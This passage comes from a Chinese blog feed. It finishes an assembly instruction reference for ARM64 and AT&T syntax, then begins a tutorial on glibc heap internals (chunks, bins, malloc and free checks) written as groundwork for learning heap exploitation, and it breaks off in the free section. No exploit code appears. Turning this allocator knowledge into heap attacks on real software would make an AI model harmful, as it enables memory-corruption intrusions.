id="cbnz"><a href="#cbnz" class="headerlink" title="cbnz"></a>cbnz</h2><p>compare and branch on non-zero. 操作数不为0，则跳转。</p><p>例如：cbnz w27, 0x1b73c9e2c 若w27中的数据不为0，则跳转到0x1b73c9e2c处执行 (Note1)。</p><h2 id="lsl"><a href="#lsl" class="headerlink" title="lsl"></a>lsl</h2><p>logical shift left. 左移位。</p><p>例如：str x0, [x1, x2, lsl #2] 将x2中的值左移两位，再加上x1中的值，得到的结果为一个内存地址，最后将x0中的数据存到该内存中。</p><h2 id="lsr"><a href="#lsr" class="headerlink" title="lsr"></a>lsr</h2><p>logical shift right. 右移位。</p><h2 id="cmp"><a href="#cmp" class="headerlink" title="cmp"></a>cmp</h2><p>compare. 比较两个数是否相等，首先将两个数相减，若差为0，则ZF (Tip2) 为1，即两者相等。</p><p>cmp w8, #0x3 通过判断w8中的值与0x3的差值是否为0，即ZF (Tip2) 是否为1，来比较两者是否相等。</p><p>Tip2: ZF是零标志位寄存器。它记录相关指令执行后，其结果是否为0。若结果为0，则ZF&#x3D;1；若结果为1，则ZF&#x3D;0。</p><h2 id="adrp"><a href="#adrp" class="headerlink" title="adrp"></a>adrp</h2><p>form pc-relative address to 4KB page. 先将操作数左移12位，再将pc的低12位清零 (即3个十六进制位清零，得到一个页对齐地址)，最后两者相加，赋值给寄存器。</p><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asm">   0x1b703f074 &lt;+44&gt;:  adrp   x20, 270332<br>-&gt; 0x1b703f078 &lt;+48&gt;:  ldr    x0, [x20, #0x7a0]<br></code></pre></td></tr></table></figure><p>执行adrp时，先将操作数270332 (十六进制为0x41ffc) 左移12位得到0x41ffc000，再将pc (0x1b703f074) 低12清零得到 0x1b703f000，最后两者相加得到0x1f903b000赋值给x20。通过控制台查看x20中的内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">x19 = 0x000000016ef25fb0<br>x20 = 0x00000001f903b000  <br>x21 = 0x0000000281454380<br></code></pre></td></tr></table></figure><h2 id="adr"><a href="#adr" class="headerlink" title="adr"></a>adr</h2><p>load a program-relative or register-relative address into a register. 是一条伪指令，遇到该指令时汇编器会生成一条add或sub指令，来计算pc和操作数的和或者差，最后将得到的结果，放在寄存器中。</p><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asm">; 生成加法指令，即x0 = 0x1022c3b08 + 0x2fc48 = 0x1022f3750<br>   0x1022c3b08 &lt;+108&gt;: adr x0, #0x2fc48  ; _MergedGlobals + 16<br>-&gt; 0x1022c3b0c &lt;+112&gt;: nop <br><br>; 生成减法指令，即x2 = 0x1022c3b10 - 0x390 = 0x1022c3780<br>   0x1022c3b10 &lt;+116&gt;: adr x2, #-0x390 ; initializeAvailabilityCheck<br>-&gt; 0x1022c3b14 &lt;+120&gt;: nop<br></code></pre></td></tr></table></figure><h2 id="brk"><a href="#brk" class="headerlink" title="brk"></a>brk</h2><p>breakpoint instruction. 用于生成断点指令异常。</p><h2 id="tbz"><a href="#tbz" class="headerlink" title="tbz"></a>tbz</h2><p>test branch zero. 测试位为0，则跳转。</p><p>tbz w24, #0x6, 0x19307005c ; 即w24第6位，若为0，则跳转到0x19307005c执行</p><p>w24 二级制数为：0b00000111000000000000100000000110</p><h2 id="tbnz"><a href="#tbnz" class="headerlink" title="tbnz"></a>tbnz</h2><p>test branch no zero. 测试位不为0，则跳转。</p><p>tbnz w24, #0x6, 0x19307005c ; 即w24第6位，若不为0，则跳转到0x19307005c执行</p><p>w24 二级制数为：0b00000111000000000000100000000110</p><h1 id="0x2-AT-T"><a href="#0x2-AT-T" class="headerlink" title="0x2. AT&amp;T"></a>0x2. AT&amp;T</h1><h2 id="test"><a href="#test" class="headerlink" title="test"></a>test</h2><p>将指令后的两个数进行按位与操作，其结果影响ZF。通常用来判断某个数是否为0&#x2F;nil。</p><p>例如：</p><p>testq %rax, %rax ; 若%rax中的值为0，则ZF&#x3D;1；反之，ZF&#x3D;0，q表示四字长</p><h2 id="sete"><a href="#sete" class="headerlink" title="sete"></a>sete</h2><p>取ZF中的值，放入目标寄存器中。</p><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asm">testq %rax, %rax  ; 两个寄存器中的值按位与，结果影响ZF<br>sete  %r12        ; 若%rax和%rbx相等，即ZF=1，则将%r12设为1，反之设为0<br></code></pre></td></tr></table></figure><h2 id="setne"><a href="#setne" class="headerlink" title="setne"></a>setne</h2><p>取ZF中的值，然后取反，再放入目标寄存器中。</p><p>例如：setne %rax 若ZF&#x3D;1，则%rax设为0；反之设为1</p><h2 id="je-jz"><a href="#je-jz" class="headerlink" title="je &#x2F; jz"></a>je &#x2F; jz</h2><p>je 和 jz这两条指令虽然名字不同，但做的事情都是一样的。即ZF&#x3D;1，则跳转。</p><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asm">libobjc.A.dylib`objc_retain:<br>    0x7fff50bad350 &lt;+0&gt;:  testq  %rdi, %rdi      ; 判断%rdi中的值(第一个参数)是否为nil<br>    0x7fff50bad353 &lt;+3&gt;:  je     0x7fff50bad371  ; &lt;+33&gt; 若%rdi为nil，则跳转到0x7fff50bad371执行<br>    0x7fff50bad355 &lt;+5&gt;:  js     0x7fff50bad373  ; &lt;+35&gt;<br>-&gt;  0x7fff50bad357 &lt;+7&gt;:  movq   (%rdi), %rax<br></code></pre></td></tr></table></figure><h2 id="jne-jnz"><a href="#jne-jnz" class="headerlink" title="jne &#x2F; jnz"></a>jne &#x2F; jnz</h2><p>jne 和 jnz这两条指令做的事情也都是一样的。即ZF&#x3D;0，则跳转。</p><h2 id="js"><a href="#js" class="headerlink" title="js"></a>js</h2><p>jump if sign. 若结果为负数，即SF&#x3D;1，则进行跳转。</p><p>SF: 符号标志位</p><p>它记录相关指令执行后，其结果是否为负。若结果为负，则SF&#x3D;1；若为非负，则SF&#x3D;0。</p><h2 id="nop"><a href="#nop" class="headerlink" title="nop"></a>nop</h2><p>no operation. 不执行任何操作。是一条单字节指令。 Opcode 90</p><h2 id="ud2"><a href="#ud2" class="headerlink" title="ud2"></a>ud2</h2><p>undefined instruction. 该指令用于生成一个无效操作码。当CPU试图执行无效或未定义的操作码时，将发生无效的操作码异常。UD2指令除了引发无效的操作码异常外，与NOP指令相同。</p><p>这里的异常是指CPU在发生“错误”时生成的。大多数情况下，有些异常并不是真正的错误，而是中断的一种类型。比如: Page Fault。异常分类如下：</p><p>Faults (错误)：这些错误可以被纠正，程序可以像什么都没有发生一样继续运行。<br>Traps (陷阱)：陷阱指令执行后会立即被报告。<br>Aborts (终止)：一些严重的不可恢复的错误。</p><h2 id="ret"><a href="#ret" class="headerlink" title="ret"></a>ret</h2><p>该指令用于子程序的返回。将栈顶数据(返回地址)弹出，赋值给 ip 寄存器，此时 sp 会增加一个内存单元大小，来释放栈空间。</p><p>{ %note info % }<br>栈底 [ … | … , parameters, return address | previous frame pointer, %rbp ] 栈顶</p><p>pop %rbp 👇</p><p>栈底 [ … | … , parameters, return address ] 栈顶</p><p>ret 👇</p><p>栈底 [ … | … , parameters ] 栈顶</p><p>caller release parameters 👇</p><p>栈底 [ … | … ] 栈顶<br>{ %endnote% }</p><h2 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h2><p>常常使用这个指令来判断两个地址中的数据是否一致：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asm">xor    %gs:0x14,%eax<br></code></pre></td></tr></table></figure><h1 id="注"><a href="#注" class="headerlink" title="注"></a>注</h1><p><a href="https://introspelliam.github.io/">本文章装载于此1</a></p><p><a href="https://www.dongxin.online/assembly/assemblyinstructions.html#_0x1-arm64">本文章装载于此2</a></p>]]></content>
    
    
    <categories>
      
      <category>汇编</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>浅析堆的申请释放及相应保护机制</title>
    <link href="/2023/11/09/%E6%B5%85%E6%9E%90%E5%A0%86%E7%9A%84%E7%94%B3%E8%AF%B7%E9%87%8A%E6%94%BE%E5%8F%8A%E7%9B%B8%E5%BA%94%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"/>
    <url>/2023/11/09/%E6%B5%85%E6%9E%90%E5%A0%86%E7%9A%84%E7%94%B3%E8%AF%B7%E9%87%8A%E6%94%BE%E5%8F%8A%E7%9B%B8%E5%BA%94%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="0×00-前面的话"><a href="#0×00-前面的话" class="headerlink" title="0×00 前面的话"></a>0×00 前面的话</h2><p>在了解这部分的时候，首先你最好阅读一下这两篇博客：</p><p><a href="Linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89.md/">Linux堆内存管理深入分析（上）</a></p><p><a href="Linux%E5%A0%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%B7%B1%E5%85%A5%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8B%EF%BC%89(1).md/">Linux堆内存管理深入分析（下）</a></p><p><strong>在内存中，堆是一个很有趣的地方，因为它可以由用户去直接的进行分配与销毁，所以也产生了一些很有趣、奇思妙想的漏洞，像unlink漏洞、House系列漏洞等等。但是在学习的过程中，我们很容易难以理解那些介绍的比较模糊的概念，比如 unsortedbin 在某些条件下会放回 smallbin 或 largebin 中，那到底是什么时候？也会对一些大佬构造的 payload 犯迷糊，为什么这里多了一个chunk，为什么这个字节要填充…，大佬们往往不对这些细节做过多的解释，但是这可难为了我们初学堆利用的新兵，所以，我想写几篇文章，将堆的运作机制，例如一些基本的概念，malloc机制、free机制、保护机制，和利用方法结合起来说一下，让大家能够对堆这一块有个较为清楚的认识，少走一些弯路。首先呢，我想在这篇文章中较为细致的介绍一下堆中的一些情况，剩下的有机会的话我会一并写成一个系列。</strong></p><p>这篇文章主要分为四个部分：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">0x01</span> chunk 简介<br><span class="hljs-number">0x02</span> bin 简介<br><span class="hljs-number">0x03</span> <span class="hljs-keyword">malloc</span> 机制<br><span class="hljs-number">0x04</span> <span class="hljs-keyword">free</span> 机制<br><br></code></pre></td></tr></table></figure><p>这些内容相对比较重要，如果看完还觉得不够的，推荐大家去读一下华庭老师的《glibc内存管理ptmalloc源代码分析》。</p><h2 id="0×01-chunk-简介"><a href="#0×01-chunk-简介" class="headerlink" title="0×01 chunk 简介"></a>0×01 chunk 简介</h2><p>首先先说一下堆是如何分配的，在内存中，堆（低地址到高地址，属性RW）有两种分配方式（与malloc申请chunk做区分）:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mmap</span>: 当申请的size大于<span class="hljs-number">128</span>kb时，由mmap分配。有时候是<span class="hljs-number">0</span>x22000<br><span class="hljs-attribute">brk</span>: 当申请的size小于<span class="hljs-number">128</span>kb时，由brk分配，第一次分配<span class="hljs-number">132</span>KB（main arena）,第二次在brk下分配，不够则执行系统调用，向系统申请<br></code></pre></td></tr></table></figure><p>在内存中进行堆的管理时，系统基本是以 chunk 作为基本单位，chunk的结构在源码中有定义</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">struct</span> <span class="hljs-type">malloc_chunk</span> &#123;<br>    INTERNAL_SIZE_T prev_size; <span class="hljs-comment">/* Size of previous chunk (if free). */</span><br>    INTERNAL_SIZE_T size; <span class="hljs-comment">/* Size in bytes, including overhead. */</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-type">malloc_chunk</span>* fd; <span class="hljs-comment">/* double links -- used only if free. */</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-type">malloc_chunk</span>* bk;<br>    <span class="hljs-comment">/* Only used for large blocks: pointer to next larger size. */</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-type">malloc_chunk</span>* fd_nextsize; <span class="hljs-comment">/* double links -- used only if free. */</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-type">malloc_chunk</span>* bk_nextsize;<br>&#125;;<br><br></code></pre></td></tr></table></figure><p>INTERNAL_SIZE_T 即 size_t</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> INTERNAL_SIZE_T</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INTERNAL_SIZE_T size_t</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br></code></pre></td></tr></table></figure><p>我们可以打印一下本机的 sizeof(size_t)，这个长度可以说是一个基准单位</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;sizeof(size_t) is %d\n&quot;</span>,<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">size_t</span>));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这个结构不再多谈，相关的介绍网上很多，主要提一下结构体中最后两个指针 fd_nextsize 和 bk_nextsize，这两个指针只在 largebin 中使用，其他情况下为 NULL。我们可以根据 chunk 的状态将其分为三种（allocated chunk、free chunk、top chunk）:</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">allocated chunk</span><span class="hljs-punctuation">:</span><br>        <span class="hljs-attribute">chunk header</span><span class="hljs-punctuation">:</span><br>            <span class="hljs-attribute">prev_size（当上一块是free状态时，存储该chunk的size，否则被上一块chunk使用）</span><br><span class="hljs-attribute">            size（该chunk大小（包括chunk header），某位3 bits为标志位）</span><br><span class="hljs-attribute">                0bit表示上一chunk是否free</span><br><span class="hljs-attribute">                1bit表示该chunk是否由mmap分配</span><br><span class="hljs-attribute">                2bit表示该chunk是否属于main arena</span><br><span class="hljs-attribute">        data</span><span class="hljs-punctuation">:</span><br><span class="hljs-punctuation"> </span><br><span class="hljs-punctuation"> </span><br><span class="hljs-attribute">free chunk</span><span class="hljs-punctuation">:</span><br>        <span class="hljs-attribute">chunk header</span><span class="hljs-punctuation">:</span><br>            <span class="hljs-attribute">prev_size</span><span class="hljs-punctuation">:</span><br>            <span class="hljs-attribute">size</span><span class="hljs-punctuation">:</span><br>        fd:指向 bin 中的next chunk<br>        bk:指向 bin 中的last chunk（bin中先进的为last，后进的为next）<br>        <span class="hljs-attribute">fd_nextsize</span><span class="hljs-punctuation">:</span><br>        <span class="hljs-attribute">bk_nextsize</span><span class="hljs-punctuation">:</span><br><span class="hljs-punctuation"></span><br><span class="hljs-punctuation"></span><br>top chunk:brk中未分配的顶端chunk<br>        <span class="hljs-attribute">chunk header</span><span class="hljs-punctuation">:</span><br>            <span class="hljs-attribute">prev_size</span><span class="hljs-punctuation">:</span><br>            <span class="hljs-attribute">size</span><span class="hljs-punctuation">:</span><br></code></pre></td></tr></table></figure><p>其中在 free chunk中有一种特殊的chunk(last remainder chunk):</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">last</span> <span class="hljs-built_in">remainder</span> chunk:从free chunk中malloc时，如果该chunk足够大，那么将其分为两部分，未分配的放到<span class="hljs-built_in">last</span> <span class="hljs-built_in">remainder</span>中并交由 unsorted bin 管理。<br><br></code></pre></td></tr></table></figure><p>重点强调一下：这里的上一块表示在内存的堆中连续的chunk的上一块，区别bin中的前后关系。另外 chunk 的前后关系只有在bin中是使用fd、bk指针标识的，在内存中连续的chunk则通过 prev_size 和 size 来寻找前后 chunk，当然，这也就造成了漏洞。</p><p><font color=#f00>由于chunk会在几种状态之间切换，当其为free chunk时，最少需要4*sizeof(size_t)的空间，所以有最小分配大小。</p><p>并且由于prev_size的复用，所以实际申请的大小为 max(2sizeof(size_t)(chunk_header)-sizeof(size_t)(prev_size)+申请大小, 最小分配大小)，而且 chunk的size是按照 2sizeof(size_t)对齐的，也就是说当你申请一个不是 2*sizeof(size_t)整倍数的空间时， malloc 返回的 size 有会对齐，大于实际申请的空间。</font></p><p>另外提一下，当 malloc 一个chunk后，实际返回用户的地址为chunk除去chunk header后的地址，而在bin中存储的是chunk的地址，也就是说</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">p</span> = malloc(<span class="hljs-number">0</span>x40); // 假设chunk的地址为 <span class="hljs-number">0</span>xdeadbeef,则返回给用户的地址是 <span class="hljs-number">0</span>xdeadbeef+sizeof(chunk header)<br><span class="hljs-attribute">free</span>(p)  //将p释放掉后，保存在bin中的地址为 <span class="hljs-number">0</span>xdeadbeef<br><br></code></pre></td></tr></table></figure><h2 id="0×02-bin简介"><a href="#0×02-bin简介" class="headerlink" title="0×02 bin简介"></a>0×02 bin简介</h2><p>bin在内存中用来管理free chunk，bin为带有头结点（链表头部不是chunk）的链表数组，根据特点，将bin分为四种，分别为(fastbin、unsortedbin、smallbin、largebin):</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs css">fastbin:<br>    根据chunk大小维护多个单向链表<br>    <span class="hljs-built_in">sizeof</span>(chunk) &lt; <span class="hljs-number">64</span>(bytes)<br>    下一chunk（内存中）的free标志位不取消，显示其仍在使用<br>    后进先出（类似栈），后free的先被malloc<br>    拥有维护固定大小chunk的<span class="hljs-number">10</span>个链表<br>unsortedbin:<br>    双向循环链表<br>    不排序<br>    暂时存储free后的chunk，一段时间后会将chunk放入对应的bin中（详见<span class="hljs-number">0</span>x02）<br>    只有一个链表<br>smallbin:<br>    双向循环链表<br>    <span class="hljs-built_in">sizeof</span>(chunk) &lt; <span class="hljs-number">512</span> (bytes)<br>    先进先出（类似队列）<br>    <span class="hljs-number">16</span>,<span class="hljs-number">24</span>...<span class="hljs-number">64</span>,<span class="hljs-number">72</span>...<span class="hljs-number">508</span> <span class="hljs-built_in">bytes</span>(<span class="hljs-number">62</span>个链表)<br>largebin:<br>    双向循环链表<br>    <span class="hljs-built_in">sizeof</span>(chunk) &gt;= <span class="hljs-number">512</span> (bytes)<br>    free chunk中多两个指针分别指向前后的large chunk<br>    <span class="hljs-number">63</span>个链表:<span class="hljs-number">0</span><span class="hljs-built_in">-31</span>(<span class="hljs-number">512</span>+<span class="hljs-number">64</span>*i)<br>            <span class="hljs-number">32</span><span class="hljs-built_in">-48</span>(<span class="hljs-number">2496</span>+<span class="hljs-number">512</span>*i)<br>            ...<br>    链表中chunk大小不固定，先大后小<br></code></pre></td></tr></table></figure><p>这其中 fastbin 像是cache，用来实现快速的chunk分配，其中的chunk size大小与smallbin中的有重复（只是说大小，chunk并不重复）</p><p>unsortedbin 功能也是作为cache，尽量减少搜索合适chunk的时间。</p><p>这四个bin中，除了fastbin，其他三个都是维护双向循环链表，并且由一个长度为128 size_t的数组bins维护，bins结构如下：</p><table><thead><tr><th>NULL</th><th>unsortbin</th><th>smallbin</th><th>largebin</th><th>NULL</th></tr></thead><tbody><tr><td>0</td><td>1</td><td>2-63</td><td>64-126</td><td>127</td></tr></tbody></table><h2 id="0×03-malloc机制"><a href="#0×03-malloc机制" class="headerlink" title="0×03 malloc机制"></a>0×03 malloc机制</h2><p>malloc功能主要由 _int_malloc() 函数实现，原型如下：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">static Void_t* <span class="hljs-built_in">_int_malloc</span>(mstate av,size_t bytes)<br><br></code></pre></td></tr></table></figure><p>当接收到申请的内存大小后，我们看一下malloc的申请过程。</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">长度位于 fastbin 时:<br>    1.根据大小获得fastbin的<span class="hljs-keyword">index</span><br>    <span class="hljs-number">2.</span>根据<span class="hljs-keyword">index</span>获取fastbin中链表的头指针<br>        如果头指针为 <span class="hljs-literal">NULL</span>，转去smallbin<br>    <span class="hljs-number">3.</span>将头指针的下一个chunk地址作为链表头指针<br>    <span class="hljs-number">4.</span>分配的chunk保持inuse状态，避免被合并<br>    <span class="hljs-number">5.</span>返回除去chunk_header的地址<br>长度位于 smallbin 时:<br>    <span class="hljs-number">1.</span>根据大小获得smallbin的<span class="hljs-keyword">index</span><br>    <span class="hljs-number">2.</span>根据<span class="hljs-keyword">index</span>获取smallbin中双向循环链表的头指针<br>    <span class="hljs-number">3.</span>将链表最后一个chunk赋值给victim<br>    <span class="hljs-number">4.</span><span class="hljs-keyword">if</span>(victim == 表头)<br>        链表为空，不从smallbin中分配<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(victim == <span class="hljs-number">0</span>)<br>        链表未初始化，将fastbin中的chunk合并<br>      <span class="hljs-keyword">else</span><br>        取出victim,设置inuse<br>    <span class="hljs-number">5.</span>检查victim是否为main_arena,设置标志位<br>    <span class="hljs-number">6.</span>返回除去chunk_header的地址<br>长度位于 largebin 时:<br>    <span class="hljs-number">1.</span>根据大小获得largebin的<span class="hljs-keyword">index</span><br>    <span class="hljs-number">2.</span>将fastbin中chunk合并，加入到unsortbin中<br><br></code></pre></td></tr></table></figure><p>留意一点：系统实际分配的内存地址与返回的地址是不同的，返回的地址直接指向了除去 chunk header 的地址。</p><p>当然，我们注意到上面的分配过程并没有完成，当 smallbin 中没有 chunk 或者 smallbin 未初始化时，并没有返回分配结果，这种情况下的chunk分配将在后面与largebin的分配一起处理</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">unsortedbin</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">1.反向遍历unsortedbin,检查 2*size_t&lt;chunk_size&lt;内存总分配量</span><br><span class="hljs-attribute">    2.unsortedbin的特殊分配</span><span class="hljs-punctuation">:</span><br>            <span class="hljs-attribute">如果前一步smallbin分配未完成</span><br><span class="hljs-attribute">            并且 unsortedbin中只有一个chunk</span><br><span class="hljs-attribute">            并且该chunk为 last remainder chunk</span><br><span class="hljs-attribute">            并且该chunk大小 &gt;（所需大小+最小分配大小）</span><br><span class="hljs-attribute">       则切分一块分配</span><br><span class="hljs-attribute">    3.如果请求大小正好等于当前遍历chunk的大小，则直接分配</span><br><span class="hljs-attribute">    4.继续遍历，将合适大小的chunk加入到smallbin中，向前插入作为链表的第一个chunk。(smallbin中每个链表中chunk大小相同)</span><br><span class="hljs-attribute">    5.将合适大小的chunk加入到largebin中，插入到合适的位置（largebin中每个链表chunk由大到小排列）</span><br><span class="hljs-attribute">largebin</span><span class="hljs-punctuation">:</span><br>    1.反向遍历largebin，由下到上查找，找到合适大小后切分<br>        切分后大小&lt;最小分配大小，返回整个chunk，会略大于申请大小<br>        切分后大小&gt;最小分配大小，加入 unsortedbin。<br>    2.未找到，index+1，继续寻找<br><br></code></pre></td></tr></table></figure><p>如果这之后还未找到合适的chunk，那么就会使用top chunk进行分配,还是没有的话，如果在多线程环境中，fastbin可能会有新的chunk，再次执行合并，并向unsortedbin中重复上面，还是没有的话，就只能向系统申请了。</p><p>以上就是malloc分配的全经过。</p><p>几个malloc检查：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-number">1</span>.从fastbin中取出chunk后，检查size是否属于fastbin<br><span class="hljs-number">2</span>.从<span class="hljs-function"><span class="hljs-title">smallbin</span>中除去chunk后，检查victim-&gt;</span><span class="hljs-function"><span class="hljs-title">bk</span>-&gt;</span>fd == victim<br><span class="hljs-number">3</span>.从unsortbin取chunk时，要检查<span class="hljs-number">2</span>*size_t&lt;chunk_size&lt;内存总分配量<br><span class="hljs-number">4</span>.从largebin取chunk时，切分后的chunk要加入unsortedbin,需要检查 unsortedbin的第一个chunk的bk是否指向unsortedbin<br><br></code></pre></td></tr></table></figure><h2 id="0×04-free机制"><a href="#0×04-free机制" class="headerlink" title="0×04 free机制"></a>0×04 free机制</h2><h3 id="1-首先使用-chunksize-p-宏获取p的size"><a href="#1-首先使用-chunksize-p-宏获取p的size" class="headerlink" title="1.首先使用 chunksize(p) 宏获取p的size"></a>1.首先使用 chunksize(p) 宏获取p的size</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREV_INUSE 0x1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IS_MMAPPED 0x2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NON_MAIN_ARENA 0x4</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SIZE_BITS (PREV_INUSE|IS_MMAPPED|NON_MAIN_ARENA)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunksize(p) ((p)-&gt;size &amp; ~(SIZE_BITS))</span><br><br></code></pre></td></tr></table></figure><p>也就是直接屏蔽了控制位信息，不过不要紧，chunk的分配是 2*sizeof(size_t) 对齐的，所以屏蔽低三位对大小无影响</p><h3 id="2-安全检查："><a href="#2-安全检查：" class="headerlink" title="2.安全检查："></a>2.安全检查：</h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">chunk的指针地址不能溢出<br>chunk 的大小 &gt;<span class="hljs-operator">=</span> MINSIZE(最小分配大小)，并且检查地址是否对齐<br><br></code></pre></td></tr></table></figure><h3 id="3-大小为fastbin的情况-不改变inuse位"><a 